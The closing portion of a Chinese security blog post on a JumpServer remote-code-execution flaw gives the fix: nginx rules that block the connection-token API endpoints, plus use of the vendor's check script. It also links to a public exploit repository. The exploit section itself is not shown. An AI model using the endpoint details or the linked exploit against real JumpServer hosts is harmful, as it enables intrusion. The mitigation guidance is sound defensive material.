+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 社区老版本</span></span><br><span class="line">/etc/nginx/conf.d/jumpserver.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 企业老版本</span></span><br><span class="line">jumpserver-release/nginx/http_server.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新版本在</span></span><br><span class="line">jumpserver-release/compose/config_static/http_server.conf</span><br></pre></td></tr></table></figure>
+
+<p><strong>Nginx 配置文件实例为：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 保证在 /api 之前 和 / 之前</span></span><br><span class="line">location /api/v1/authentication/connection-token/ &#123;</span><br><span class="line">   <span class="built_in">return</span> 403;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">location /api/v1/users/connection-token/ &#123;</span><br><span class="line">   <span class="built_in">return</span> 403;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新增以上这些 </span></span><br><span class="line">location /api/ &#123;</span><br><span class="line">   proxy_set_header X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">   proxy_set_header Host <span class="variable">$host</span>;</span><br><span class="line">   proxy_set_header X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">   proxy_pass http://core:8080;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>修改配置文件完毕后，重启 Nginx 服务即可</strong></p>
+<p><strong>修复验证：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://github.com/jumpserver/jumpserver/releases/download/v2.6.2/jms_bug_check.sh </span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用方法 bash jms_bug_check.sh HOST </span></span><br><span class="line">$ bash jms_bug_check.sh demo.jumpserver.org</span><br><span class="line">漏洞已修复</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Skactor/jumpserver_rce">https://github.com/Skactor/jumpserver_rce</a></li>
+<li><a target="_blank" rel="noopener" href="https://saucer-man.com/information_security/520.html">https://saucer-man.com/information_security/520.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.o2oxy.cn/2921.html">https://www.o2oxy.cn/2921.html</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">离沫凌天๓</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.lintstar.top/2021/01/a3a6c3e5.html">https://www.lintstar.top/2021/01/a3a6c3e5.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.lintstar.top" target="_blank">离沫凌天๓</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Python/">Python</a><a class="post-meta__tags" href="/tags/Vulnerability/">Vulnerability</a><a class="post-meta__tags" href="/tags/WebSocket/">WebSocket</a><a class="post-meta__tags" href="/tags/RCE/">RCE</a></div><div class="post_share"><div class="social-share" data-image="https://qiniuyun.lintstar.top/hexo/20210201132315.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/bc3116a4.html"><img class="prev-cover" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210323143741.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">VPS 配置记录</div></div></a></div><div class="next-post pull-right"><a href="/2021/01/9072ee96.html"><img class="next-cover" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210201132431.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">子域名接管</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a target="_blank" rel="noopener" href="//2020/10/2eadcca4.html" title="MacOS python3 安装 gevent 模块"><img class="cover" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201029000055.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-29</div><div class="title">MacOS python3 安装 gevent 模块</div></div></a></div><div><a target="_blank" rel="noopener" href="//2020/11/d200c39.html" title="打造专属 Cobalt Strike"><img class="cover" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201122012743.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-20</div><div class="title">打造专属 Cobalt Strike</div></div></a></div><div><a target="_blank" rel="noopener" href="//2021/01/5bf799f.html" title="Python 实现自动登录签到及微信通知"><img class="cover" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210124121336.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-22</div><div class="title">Python 实现自动登录签到及微信通知</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/plogo/Alogo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">离沫凌天๓</div><div class="author-info__description">花开花落 一路上起起跌跌</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">42</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" href="/message/"><i class="fas fa-star"></i><span>With Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:admin@lintstar.top" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="Rss"><i class="fas fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">" 我顶着大太阳 只想为你撑伞 "</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><span class="toc-number">2.</span> <span class="toc-text">漏洞详情</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">2.1.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.2.</span> <span class="toc-text">环境搭建</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%84%9A%E6%9C%AC"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">4.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/07/e65fcded.html" title="CS-ServerChan 主机上线微信通知"><img data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210728115114.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CS-ServerChan 主机上线微信通知"/></a><div class="content"><a class="title" href="/2021/07/e65fcded.html" title="CS-ServerChan 主机上线微信通知">CS-ServerChan 主机上线微信通知</a><time datetime="2021-07-28T03:49:59.000Z" title="发表于 2021-07-28 11:49:59">2021-07-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/d1676e54.html" title="LSTAR - CobaltStrike 后渗透插件"><img data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210707153910.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="LSTAR - CobaltStrike 后渗透插件"/></a><div class="content"><a class="title" href="/2021/07/d1676e54.html" title="LSTAR - CobaltStrike 后渗透插件">LSTAR - CobaltStrike 后渗透插件</a><time datetime="2021-07-07T05:49:59.000Z" title="发表于 2021-07-07 13:49:59">2021-07-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/cc6d559a.html" title="MSF 作战手册及联动 CobaltStrike"><img data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210705103406.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MSF 作战手册及联动 CobaltStrike"/></a><div class="content"><a class="title" href="/2021/06/cc6d559a.html" title="MSF 作战手册及联动 CobaltStrike">MSF 作战手册及联动 CobaltStrike</a><time datetime="2021-06-12T15:49:59.000Z" title="发表于 2021-06-12 23:49:59">2021-06-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/b5afb4fa.html" title="安装 YunYouJun 牌云空调"><img data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511015535.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="安装 YunYouJun 牌云空调"/></a><div class="content"><a class="title" href="/2021/05/b5afb4fa.html" title="安装 YunYouJun 牌云空调">安装 YunYouJun 牌云空调</a><time datetime="2021-05-10T14:22:22.000Z" title="发表于 2021-05-10 22:22:22">2021-05-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/4b5824a3.html" title="MacOS Big Sur 配置及使用记录"><img data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511132831.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MacOS Big Sur 配置及使用记录"/></a><div class="content"><a class="title" href="/2021/04/4b5824a3.html" title="MacOS Big Sur 配置及使用记录">MacOS Big Sur 配置及使用记录</a><time datetime="2021-04-20T15:49:59.000Z" title="发表于 2021-04-20 23:49:59">2021-04-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://qiniuyun.lintstar.top/hexo/20210201132315.webp)"><div id="footer-wrap"><div class="copyright">&copy;2018 - 2021 <i style="color:#FF6A6A" class="fa fa-heartbeat"></i> 离沫凌天๓</div><div class="footer_custom_text">生如逐放 心有焰藏</div><div class="icp"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><img class="icp-icon" src="/plogo/icp.png"/><span>津ICP备18005284号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.spacingElementById('content-inner')
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.spacingElementById('content-inner')
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'IO9a37akXEBhcRHfWBtCYpP4-gzGzoHsz',
+      appKey: 'yIfjz0E13epDN98BRX5uxeM7',
+      placeholder: '请畅所欲言吧！昵称那里填写你的QQ号就可以自动获取邮箱、头像、昵称啦',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: true,
+      serverURLs: 'https:com.lintstar.top',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: true,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign(initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="true"></script></div></body></html>
